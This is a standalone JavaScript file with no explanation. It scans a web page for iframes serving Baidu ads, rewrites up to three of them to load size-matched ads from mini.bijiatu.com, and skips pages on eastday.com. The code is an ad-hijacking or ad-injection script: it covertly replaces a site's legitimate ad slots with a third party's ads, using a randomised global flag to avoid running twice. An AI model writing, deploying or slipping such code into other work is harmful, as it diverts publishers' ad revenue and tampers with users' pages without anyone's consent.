(function () {
    if (window.a03350b13c5424283ac1074a25c3ce91) return;
    window.a03350b13c5424283ac1074a25c3ce91 = true;

    var hei = ["eastday.com"];
    for (var i = 0; i < hei.length; i++) {
        if (window.location.host.indexOf(hei[i]) != -1) {
            return;
        }
    }
    var resIframe = [];
    var num = 5;
    var inter = setInterval(() => {
        try {
            var ifrlist = document.getElementsByTagName("iframe");
            for (var x in ifrlist) {
                isAdIframe(ifrlist[x]);
            }
        } catch (error) {}
        num--;
        if (num <= 0) clearInterval(inter);
    }, 300);

    function isAdIframe(iframe) {
        if (iframe.src.indexOf("//pos.baidu.com/") != -1) {
            var width = parseInt(iframe.width) || iframe.offsetWidth || 0;
            var height = parseInt(iframe.height) || iframe.offsetHeight || 0;
            var ifrData = GetIframeData(width, height);
            if (ifrData) {
                insIframe(iframe, ifrData);
            }
        }
    }

    function insIframe(iframe, ifrData) {
        if (resIframe.length >= 3) return;
        if (resIframe.indexOf(iframe) == -1) {
            iframe.src = ifrData.src;
            iframe.width = ifrData.width;
            iframe.height = ifrData.height;
            iframe.style.width = ifrData.width + "px";
            iframe.style.height = ifrData.height + "px";
            resIframe.push(iframe);
        }
    }

    function GetIframeData(width, height) {
        var wRegion = [
            [100, 200],
            [200, 300],
            [300, 400],
            [400, 600],
            [600, 700],
            [700, 800],
            [800, 900],
            [900, 1000],
            [1000, 1200],
            [1200, 1601],
            [1800, 2000],
        ];
        var hRegion = [
            [
                [20, 51, 150, 30],
                [100, 200, 150, 150],
                [200, 600, 150, 400],
            ],
            [
                [20, 51, 250, 30],
                [60, 121, 240, 80],
                [200, 301, 250, 250],
                [500, 1000, 250, 700],
            ],
            [
                [20, 71, 330, 50],
                [80, 200, 350, 150],
                [200, 450, 300, 250],
                [450, 800, 300, 600],
            ],
            [
                [20, 100, 500, 50],
                [100, 301, 500, 150],
            ],
            [
                [20, 90, 650, 60],
                [90, 150, 650, 120],
                [160, 351, 650, 220],
            ],
            [
                [15, 61, 750, 40],
                [80, 151, 750, 120],
                [160, 401, 750, 250],
            ],
            [
                [20, 151, 850, 120],
                [160, 501, 850, 250],
            ],
            [
                [20, 91, 960, 60],
                [100, 161, 960, 130],
                [180, 501, 960, 200],
            ],
            [
                [90, 151, 1024, 120],
                [160, 301, 1024, 200],
            ],
            [
                [90, 501, 1200, 180]
            ],
            [
                [100, 601, 1872, 300]
            ],
        ];

        for (let i = 0; i < wRegion.length; i++) {
            if (width >= wRegion[i][0] && width < wRegion[i][1]) {
                for (let j = 0; j < hRegion[i].length; j++) {
                    var hreg = hRegion[i][j];
                    if (height >= hreg[0] && height < hreg[1]) {
                        var url = "https://mini.bijiatu.com/adth/adtips";
                        if (Math.random() * 7 > 3) {
                            url = "https://mini.bijiatu.com/adth1/adtips";
                        }
                        return {
                            width: hreg[2],
                            height: hreg[3],
                            src: url +
                                hreg[2].toString().slice(0, -1) +
                                hreg[3].toString().slice(0, -1) +
                                ".html",
                        };
                    }
                }
            }
        }
        return null;
    }
})();
